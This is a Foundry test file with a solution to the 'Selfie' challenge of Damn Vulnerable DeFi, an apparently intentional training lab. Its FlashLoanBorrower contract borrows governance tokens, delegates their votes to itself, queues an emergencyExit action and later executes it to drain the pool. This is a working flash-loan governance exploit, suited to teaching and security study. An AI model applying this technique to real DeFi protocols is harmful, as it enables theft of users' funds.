// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {Votes} from "@openzeppelin/contracts/governance/utils/Votes.sol";

contract FlashLoanBorrower is IERC3156FlashBorrower {
    address private immutable i_recover;
    address private immutable i_pool;
    address private immutable i_governance;

    constructor(address _pool, address recoveryAddress, address governanceAddress) {
        i_pool = _pool;
        i_recover = recoveryAddress;
        i_governance = governanceAddress;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        require(DamnValuableVotes(token).balanceOf(address(this)) >= amount, "Insufficient balance for flash loan");
        //delegate tokens to the contract itself
        DamnValuableVotes(token).delegate(address(this));

        bytes memory functionCall = abi.encodeCall(SelfiePool.emergencyExit, (i_recover));
        SimpleGovernance(i_governance).queueAction(i_pool, 0, functionCall);
        //approve the FlashLoan lender to transfer the tokens back
        DamnValuableVotes(token).approve(msg.sender, amount + fee);
        //return the tokens to the lender
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        FlashLoanBorrower borrower = new FlashLoanBorrower(address(pool), recovery, address(governance));
        pool.flashLoan(borrower, address(token), TOKENS_IN_POOL, hex"");
        assertEq(governance.getActionCounter(), 2, "Action counter should be 2");

        vm.warp(block.timestamp + governance.getActionDelay());
        //execute action
        uint256 actionId = governance.getActionCounter() - 1; // Get the last action ID
        governance.executeAction(actionId);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
